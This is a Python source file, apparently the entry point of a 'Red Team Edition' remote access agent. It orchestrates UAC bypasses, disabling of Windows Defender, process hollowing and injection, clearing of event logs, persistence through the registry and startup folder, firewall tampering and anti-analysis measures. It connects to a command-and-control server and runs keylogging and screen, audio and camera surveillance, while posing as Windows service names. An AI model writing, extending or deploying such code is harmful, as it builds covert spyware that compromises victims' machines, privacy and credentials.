"""
Main entry point for the Agent Client - RED TEAM EDITION
Orchestrates all modules and provides aggressive red team capabilities
Enhanced with comprehensive UAC bypasses, stealth features, and automated exploitation
"""

import sys
import time
import signal
import random
import os
import threading
import queue
from typing import Optional

# Red Team imports
from logging_utils import log_message, setup_silent_logging, notify_controller_client_only
from config import SILENT_MODE, validate_secret_hashes
from dependencies import check_system_requirements, WINDOWS_AVAILABLE
from uac_bypass import is_admin

class RedTeamInitializer:
    """Aggressive red team initialization with comprehensive exploitation."""
    
    def __init__(self):
        self.initialization_threads = []
        self.initialization_complete = threading.Event()
        self.initialization_results = {}
        self.initialization_lock = threading.Lock()
        self.quick_mode = False
    
    def start_aggressive_initialization(self, quick_startup=False):
        """Start all aggressive red team initialization tasks."""
        self.quick_mode = quick_startup
        log_message("🔥 Starting aggressive red team initialization...")
        
        if quick_startup:
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("stealth_features", self._init_stealth_features),
                ("components", self._init_components)
            ]
            log_message("⚡ Quick red team mode activated")
        else:
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("uac_bypass_comprehensive", self._init_comprehensive_uac_bypass),
                ("stealth_features", self._init_stealth_features),
                ("persistence_setup", self._init_persistence_setup),
                ("defender_disable", self._init_defender_disable),
                ("process_hiding", self._init_process_hiding),
                ("firewall_bypass", self._init_firewall_bypass),
                ("startup_config", self._init_startup_config),
                ("components", self._init_components),
                ("anti_analysis", self._init_anti_analysis)
            ]
            log_message("🎯 Full red team mode - all exploitation techniques enabled")
        
        for task_name, task_func in tasks:
            thread = threading.Thread(
                target=self._run_initialization_task,
                args=(task_name, task_func),
                daemon=True
            )
            thread.start()
            self.initialization_threads.append(thread)
        
        # Start monitor and progress threads
        monitor_thread = threading.Thread(target=self._monitor_initialization, daemon=True)
        monitor_thread.start()
        
        progress_thread = threading.Thread(target=self._show_progress, daemon=True)
        progress_thread.start()
    
    def _show_progress(self):
        """Show aggressive initialization progress."""
        dots = 0
        while not self.initialization_complete.is_set():
            status = self.get_initialization_status()
            completed = len([r for r in status.values() if r])
            total = len(self.initialization_threads)
            
            if total > 0:
                progress_bar = "🔥" * completed + "⚫" * (total - completed)
                dots = (dots + 1) % 4
                dot_str = "." * dots
                
                print(f"\r🎯 Red Team Progress: [{progress_bar}] {completed}/{total} exploits complete{dot_str}", end="", flush=True)
            time.sleep(0.3)
        
        if total > 0:
            print(f"\r✅ Red Team initialization complete! All {total} exploits finished.    ")
    
    def _run_initialization_task(self, task_name, task_func):
        """Run a single initialization task with timeout."""
        try:
            result_queue = queue.Queue()
            exception_queue = queue.Queue()
            
            def task_wrapper():
                try:
                    result = task_func()
                    result_queue.put(result)
                except Exception as e:
                    exception_queue.put(e)
            
            task_thread = threading.Thread(target=task_wrapper, daemon=True)
            task_thread.start()
            
            try:
                result = result_queue.get(timeout=45)  # Longer timeout for red team ops
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': True,
                        'result': result,
                        'error': None
                    }
                    log_message(f"✅ {task_name}: {result}")
            except queue.Empty:
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': False,
                        'result': None,
                        'error': 'Task timed out'
                    }
                    log_message(f"⏰ {task_name}: Timed out", "warning")
                    
        except Exception as e:
            with self.initialization_lock:
                self.initialization_results[task_name] = {
                    'success': False,
                    'result': None,
                    'error': str(e)
                }
                log_message(f"❌ {task_name}: {e}", "error")
    
    def _monitor_initialization(self):
        """Monitor initialization progress."""
        while len(self.initialization_threads) > 0:
            active_threads = [t for t in self.initialization_threads if t.is_alive()]
            if len(active_threads) == 0:
                break
            time.sleep(0.1)
        
        self.initialization_complete.set()
        log_message("🎉 Red team initialization complete")
    
    def _init_privilege_escalation(self):
        """Aggressive privilege escalation."""
        if not WINDOWS_AVAILABLE:
            return "non_windows_skip"
        
        if is_admin():
            log_message("🔓 Already admin - disabling UAC completely")
            from uac_bypass import disable_uac
            if disable_uac():
                return "admin_uac_disabled"
            return "admin_uac_failed"
        
        log_message("🚀 Attempting aggressive privilege escalation")
        from uac_bypass import elevate_privileges
        if elevate_privileges():
            return "elevation_successful"
        return "elevation_failed"
    
    def _init_comprehensive_uac_bypass(self):
        """Run all available UAC bypass methods."""
        if not WINDOWS_AVAILABLE or is_admin():
            return "uac_bypass_skip"
        
        log_message("🛡️ Running comprehensive UAC bypass suite")
        
        from uac_bypass import (
            bypass_uac_fodhelper_protocol, bypass_uac_computerdefaults,
            bypass_uac_eventvwr, bypass_uac_sdclt, bypass_uac_wsreset,
            bypass_uac_cmlua_com, bypass_uac_slui_hijack
        )
        
        bypass_methods = [
            ("FodHelper", bypass_uac_fodhelper_protocol),
            ("ComputerDefaults", bypass_uac_computerdefaults),
            ("EventVwr", bypass_uac_eventvwr),
            ("Sdclt", bypass_uac_sdclt),
            ("WSReset", bypass_uac_wsreset),
            ("CMLua", bypass_uac_cmlua_com),
            ("Slui", bypass_uac_slui_hijack)
        ]
        
        successful_bypasses = []
        for method_name, method_func in bypass_methods:
            try:
                if method_func():
                    successful_bypasses.append(method_name)
                    log_message(f"✅ UAC bypass successful: {method_name}")
                else:
                    log_message(f"❌ UAC bypass failed: {method_name}")
            except Exception as e:
                log_message(f"💥 UAC bypass error {method_name}: {e}")
        
        return f"bypasses_successful_{len(successful_bypasses)}_of_{len(bypass_methods)}"
    
    def _init_stealth_features(self):
        """Initialize comprehensive stealth features."""
        log_message("👻 Activating stealth mode")
        
        try:
            from security import hide_process, clear_event_logs, modify_file_timestamps
            
            stealth_results = []
            
            # Process hiding
            if hide_process():
                stealth_results.append("process_hidden")
            
            # Clear event logs
            if clear_event_logs():
                stealth_results.append("logs_cleared")
            
            # Modify timestamps
            if modify_file_timestamps():
                stealth_results.append("timestamps_modified")
            
            return f"stealth_features_{len(stealth_results)}_activated"
            
        except Exception as e:
            return f"stealth_failed: {e}"
    
    def _init_persistence_setup(self):
        """Aggressive persistence setup."""
        log_message("🔒 Establishing comprehensive persistence")
        
        try:
            from persistence import establish_persistence, setup_advanced_persistence
            
            basic_persistence = establish_persistence()
            advanced_persistence = setup_advanced_persistence()
            
            if basic_persistence and advanced_persistence:
                return "persistence_comprehensive"
            elif basic_persistence:
                return "persistence_basic"
            else:
                return "persistence_failed"
                
        except Exception as e:
            return f"persistence_error: {e}"
    
    def _init_defender_disable(self):
        """Aggressively disable Windows Defender."""
        if not WINDOWS_AVAILABLE:
            return "non_windows_skip"
        
        log_message("🛡️ Disabling Windows Defender")
        
        try:
            from security import disable_defender
            if disable_defender():
                return "defender_disabled"
            else:
                return "defender_failed"
        except Exception as e:
            return f"defender_error: {e}"
    
    def _init_process_hiding(self):
        """Advanced process hiding techniques."""
        log_message("🫥 Implementing advanced process hiding")
        
        try:
            from security import (
                advanced_process_hiding, hollow_process, 
                inject_into_trusted_process, create_decoy_processes
            )
            
            hiding_results = []
            
            if advanced_process_hiding():
                hiding_results.append("advanced_hiding")
            
            if hollow_process():
                hiding_results.append("process_hollowing")
            
            if inject_into_trusted_process():
                hiding_results.append("process_injection")
            
            if create_decoy_processes():
                hiding_results.append("decoy_processes")
            
            return f"hiding_techniques_{len(hiding_results)}_applied"
            
        except Exception as e:
            return f"hiding_failed: {e}"
    
    def _init_firewall_bypass(self):
        """Comprehensive firewall bypass."""
        log_message("🔥 Bypassing firewall restrictions")
        
        try:
            from security import add_firewall_exception, disable_removal_tools
            
            firewall_results = []
            
            if add_firewall_exception():
                firewall_results.append("exceptions_added")
            
            if disable_removal_tools():
                firewall_results.append("removal_tools_disabled")
            
            return f"firewall_bypass_{len(firewall_results)}_methods"
            
        except Exception as e:
            return f"firewall_failed: {e}"
    
    def _init_startup_config(self):
        """Configure multiple startup methods."""
        log_message("🚀 Configuring startup persistence")
        
        try:
            from persistence import add_to_startup, add_registry_startup, add_startup_folder_entry
            
            startup_results = []
            
            if add_to_startup():
                startup_results.append("general_startup")
            
            if add_registry_startup():
                startup_results.append("registry_startup")
            
            if add_startup_folder_entry():
                startup_results.append("folder_startup")
            
            return f"startup_methods_{len(startup_results)}_configured"
            
        except Exception as e:
            return f"startup_error: {e}"
    
    def _init_components(self):
        """Initialize high-performance components."""
        log_message("⚙️ Initializing high-performance components")
        
        try:
            # Initialize input handling
            from input_handler import initialize_low_latency_input
            initialize_low_latency_input()
            
            # Initialize socket client
            from socket_client import initialize_socket_client
            sio = initialize_socket_client()
            
            if sio:
                return "components_initialized"
            else:
                return "components_partial"
                
        except Exception as e:
            return f"components_failed: {e}"
    
    def _init_anti_analysis(self):
        """Implement anti-analysis techniques."""
        log_message("🕵️ Implementing anti-analysis measures")
        
        try:
            from security import anti_analysis, obfuscate_strings, sleep_random_non_blocking
            
            analysis_results = []
            
            if anti_analysis():
                analysis_results.append("anti_analysis")
            
            obfuscate_strings()
            analysis_results.append("string_obfuscation")
            
            sleep_random_non_blocking()
            analysis_results.append("timing_obfuscation")
            
            return f"anti_analysis_{len(analysis_results)}_methods"
            
        except Exception as e:
            return f"analysis_failed: {e}"
    
    def get_initialization_status(self):
        """Get current initialization status."""
        with self.initialization_lock:
            return {task: result['success'] for task, result in self.initialization_results.items()}
    
    def wait_for_completion(self, timeout=None):
        """Wait for initialization to complete."""
        return self.initialization_complete.wait(timeout)
    
    def get_results(self):
        """Get detailed initialization results."""
        with self.initialization_lock:
            return dict(self.initialization_results)

def signal_handler(signum, frame):
    """Enhanced signal handler with better error handling."""
    log_message(f"Shutdown signal {signum} received. Initiating graceful shutdown...")
    
    try:
        # Stop all services
        stop_all_services()
        
        # Disconnect from controller
        from socket_client import disconnect_from_controller
        disconnect_from_controller()
        
        log_message("Graceful shutdown completed")
        
    except Exception as e:
        log_message(f"Error during shutdown: {e}", "error")
    
    sys.exit(0)

def stop_all_services():
    """Enhanced service shutdown with better error handling."""
    log_message("Stopping all agent services...")
    
    services_to_stop = [
        ("Screen streaming", lambda: _safe_stop_service("streaming", "stop_streaming")),
        ("Audio streaming", lambda: _safe_stop_service("streaming", "stop_audio_streaming")),
        ("Camera streaming", lambda: _safe_stop_service("streaming", "stop_camera_streaming")),
        ("Keylogger", lambda: _safe_stop_service("input_handler", "stop_keylogger")),
        ("Clipboard monitor", lambda: _safe_stop_service("input_handler", "stop_clipboard_monitor")),
        ("Voice control", lambda: _safe_stop_service("input_handler", "stop_voice_control")),
    ]
    
    for service_name, stop_func in services_to_stop:
        try:
            stop_func()
            log_message(f"{service_name} stopped successfully")
        except Exception as e:
            log_exception(f"Error stopping {service_name}", e)
    
    log_security_event("All services shutdown completed")

def _safe_stop_service(module_name: str, function_name: str):
    """Safely stop a service with proper error handling."""
    try:
        module = __import__(module_name)
        stop_func = getattr(module, function_name)
        stop_func()
    except ImportError:
        log_message(f"Module {module_name} not available", "warning")
    except AttributeError:
        log_message(f"Function {function_name} not found in {module_name}", "warning")
    except Exception as e:
        raise e

def initialize_components():
    """Initialize all agent components."""
    log_message("Initializing agent components...")
    
    # Initialize stealth mode
    try:
        from security import sleep_random_non_blocking
        sleep_random_non_blocking()
    except Exception as e:
        log_message(f"Stealth initialization failed: {e}")
    
    # Check system requirements
    if not check_system_requirements():
        log_message("Some critical requirements are missing", "warning")
    
    # Validate configuration
    validate_secret_hashes()
    
    # Initialize input handling
    try:
        from input_handler import initialize_low_latency_input
        initialize_low_latency_input()
    except Exception as e:
        log_message(f"Input handler initialization failed: {e}", "error")
    
    # Initialize socket client
    try:
        from socket_client import initialize_socket_client
        sio = initialize_socket_client()
        if not sio:
            log_message("Socket client initialization failed", "error")
            return False
    except Exception as e:
        log_message(f"Socket client initialization failed: {e}", "error")
        return False
    
    # Setup security features
    try:
        from security import hide_process, add_firewall_exception
        hide_process()
        add_firewall_exception()
    except Exception as e:
        log_message(f"Security setup failed: {e}", "error")
    
    log_message("Agent components initialized successfully")
    return True

def setup_persistence():
    """Setup persistence mechanisms."""
    log_message("Setting up persistence...")
    
    try:
        from persistence import establish_persistence
        success = establish_persistence()
        
        if success:
            log_message("Persistence mechanisms established")
        else:
            log_message("Failed to establish persistence", "warning")
        
        return success
        
    except Exception as e:
        log_message(f"Persistence setup failed: {e}", "error")
        return False

def execute_red_team_initialization():
    """Execute comprehensive red team initialization."""
    log_message("🎯 Initializing Red Team Agent")
    
    # Create red team initializer
    red_team = RedTeamInitializer()
    
    # Check if we want quick mode (for faster deployment)
    quick_mode = "--quick" in sys.argv or "-q" in sys.argv
    
    # Start aggressive initialization
    red_team.start_aggressive_initialization(quick_startup=quick_mode)
    
    # Wait for completion with timeout
    if red_team.wait_for_completion(timeout=120):  # 2 minute timeout
        results = red_team.get_results()
        
        # Display results
        log_message("📊 Red Team Initialization Results:")
        successful_tasks = 0
        total_tasks = len(results)
        
        for task_name, result in results.items():
            if result['success']:
                log_message(f"✅ {task_name}: {result['result']}")
                successful_tasks += 1
            else:
                log_message(f"❌ {task_name}: {result['error']}", "warning")
        
        success_rate = (successful_tasks / total_tasks) * 100 if total_tasks > 0 else 0
        log_message(f"🎯 Red Team Success Rate: {successful_tasks}/{total_tasks} ({success_rate:.1f}%)")
        
        return success_rate > 50  # Consider successful if >50% tasks completed
    else:
        log_message("⏰ Red team initialization timed out", "error")
        return False

def start_agent_services():
    """Start core agent services."""
    log_message("Starting agent services...")
    
    try:
        # Start socket client thread
        from socket_client import start_socket_client_thread
        start_socket_client_thread()
        
        # Get agent ID
        from streaming import get_or_create_agent_id
        agent_id = get_or_create_agent_id()
        
        log_message(f"Agent ID: {agent_id}")
        
        # Send online notification
        notify_controller_client_only(agent_id)
        
        return agent_id
        
    except Exception as e:
        log_message(f"Failed to start agent services: {e}", "error")
        return None

def main_loop(agent_id):
    """Main agent loop."""
    log_message("Starting main agent loop...")
    
    loop_count = 0
    last_heartbeat = time.time()
    last_persistence_check = time.time()
    
    while True:
        try:
            current_time = time.time()
            loop_count += 1
            
            # Heartbeat every 60 seconds
            if current_time - last_heartbeat > 60:
                try:
                    from socket_client import send_agent_status, is_connected
                    
                    if is_connected():
                        status_data = {
                            'loop_count': loop_count,
                            'uptime': current_time,
                            'services': get_service_status()
                        }
                        send_agent_status(agent_id, status_data)
                    
                    last_heartbeat = current_time
                    
                except Exception as e:
                    log_message(f"Heartbeat error: {e}", "error")
            
            # Check persistence every 10 minutes
            if current_time - last_persistence_check > 600:
                try:
                    from persistence import check_and_restore
                    check_and_restore()
                    last_persistence_check = current_time
                except Exception as e:
                    log_message(f"Persistence check error: {e}", "error")
            
            # Sleep for 5 seconds
            time.sleep(5)
            
        except KeyboardInterrupt:
            log_message("Keyboard interrupt received")
            break
        except Exception as e:
            log_message(f"Main loop error: {e}", "error")
            time.sleep(10)  # Longer sleep on error

def get_service_status():
    """Get status of all services."""
    try:
        from socket_client import is_connected
        from streaming import STREAMING_ENABLED, AUDIO_STREAMING_ENABLED, CAMERA_STREAMING_ENABLED
        from input_handler import KEYLOGGER_ENABLED, CLIPBOARD_MONITOR_ENABLED, VOICE_CONTROL_ENABLED
        
        return {
            'socket_connected': is_connected(),
            'screen_streaming': STREAMING_ENABLED,
            'audio_streaming': AUDIO_STREAMING_ENABLED,
            'camera_streaming': CAMERA_STREAMING_ENABLED,
            'keylogger': KEYLOGGER_ENABLED,
            'clipboard_monitor': CLIPBOARD_MONITOR_ENABLED,
            'voice_control': VOICE_CONTROL_ENABLED
        }
    except Exception as e:
        log_message(f"Error getting service status: {e}", "error")
        return {}

def display_startup_banner():
    """Red Team startup banner with attack capabilities."""
    if not SILENT_MODE:
        # Legitimate service names for stealth
        service_names = [
            "Windows Security Update Service",
            "Microsoft Defender Service",
            "System Configuration Manager",
            "Windows Update Assistant",
            "Security Center Service",
            "Windows Maintenance Service"
        ]
        
        service_name = random.choice(service_names)
        print("=" * 80)
        print(f"🔥 {service_name} v2.1 - RED TEAM EDITION")
        print("=" * 80)
        print("🎯 TACTICAL CYBER OPERATIONS")
        print(f"   📍 Operating Directory: {os.getcwd()}")
        print(f"   🐍 Python Runtime: {sys.version.split()[0]}")
        print(f"   🔓 Privilege Level: {'🔴 ADMINISTRATOR' if is_admin() else '🟡 STANDARD USER'}")
        print(f"   🖥️  Target Platform: {os.name.upper()}")
        
        print("\n🎭 RED TEAM CAPABILITIES:")
        print("  💀 7 Advanced UAC Bypass Techniques")
        print("  👻 Comprehensive Stealth & Anti-Analysis")
        print("  🔐 Multi-Vector Persistence Mechanisms")
        print("  🛡️  Windows Defender Neutralization")
        print("  📡 Real-time C2 Communication")
        print("  🎥 Multi-Stream Surveillance (Screen/Audio/Camera)")
        print("  ⌨️  Advanced Input Monitoring & Control")
        print("  📁 Covert File Transfer Operations")
        print("  🔄 Process Injection & Hollowing")
        print("  🔥 Automated Firewall Bypass")
        print("  📊 System Intelligence Gathering")
        print("  🕵️ Anti-Forensics & Log Evasion")
        
        print("\n⚡ DEPLOYMENT MODES:")
        print("  🚀 Full Red Team Mode: python main.py")
        print("  ⚡ Quick Deploy Mode: python main.py --quick")
        print("=" * 80)

def main():
    """Enhanced main entry point with comprehensive error handling."""
    startup_time = time.time()
    
    try:
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        if hasattr(signal, 'SIGBREAK'):  # Windows
            signal.signal(signal.SIGBREAK, signal_handler)
        
        # Initialize enhanced logging
        setup_silent_logging()
        
        # Display enhanced banner
        display_startup_banner()
        
        log_message("🚀 Red Team Agent Controller starting up...")
        
        # Initialize components with enhanced error handling
        log_message("📦 Initializing components...")
        if not initialize_components():
            log_message("❌ Component initialization failed", "error")
            return 1
        
        log_message("✅ Components initialized successfully")
        
        # Execute aggressive red team initialization
        log_message("🔥 Executing Red Team Initialization Protocol...")
        red_team_success = execute_red_team_initialization()
        
        if red_team_success:
            log_message("🎉 Red Team initialization successful - Full operational capability")
        else:
            log_message("⚠️  Red Team initialization partial - Limited operational capability", "warning")
        
        # Start agent services
        log_message("🌐 Starting agent services...")
        agent_id = start_agent_services()
        if not agent_id:
            log_message("❌ Failed to start agent services", "error")
            return 1
        
        log_message(f"✅ Agent services started - ID: {agent_id}")
        
        # Enhanced connection handling
        log_message("🔌 Establishing controller connection...")
        from socket_client import wait_for_connection
        if wait_for_connection(timeout=30):
            log_message("✅ Connected to controller successfully")
        else:
            log_message("⚠️  Failed to connect to controller within timeout", "warning")
        
        # Calculate startup time
        startup_duration = time.time() - startup_time
        log_message(f"🎯 Red Team Agent deployment completed in {startup_duration:.2f} seconds")
        log_message("🔥 Red Team Agent is fully operational and ready for tasking")
        
        # Show final status
        if red_team_success:
            log_message("🚀 STATUS: FULLY WEAPONIZED")
        else:
            log_message("⚠️  STATUS: PARTIALLY WEAPONIZED")
        
        log_message(f"👤 Agent ID: {agent_id}")
        log_message(f"🔓 Privilege Level: {'ADMINISTRATOR' if is_admin() else 'STANDARD USER'}")
        log_message(f"⏱️  Deployment Time: {startup_duration:.2f}s")
        
        # Start enhanced main loop
        log_message("🔄 Starting main agent loop...")
        main_loop(agent_id)
        
    except KeyboardInterrupt:
        log_message("🛑 Shutdown requested by user")
    except Exception as e:
        log_message(f"Fatal error in main: {e}", "error")
        return 1
    finally:
        # Enhanced cleanup
        try:
            log_message("🧹 Performing cleanup...")
            stop_all_services()
            
            log_message("✅ Cleanup completed")
        except Exception as e:
            log_message(f"Error during cleanup: {e}", "error")
    
    log_message("🔥 Red Team Agent shutdown complete - Mission terminated")
    return 0

if __name__ == "__main__":
    sys.exit(main())
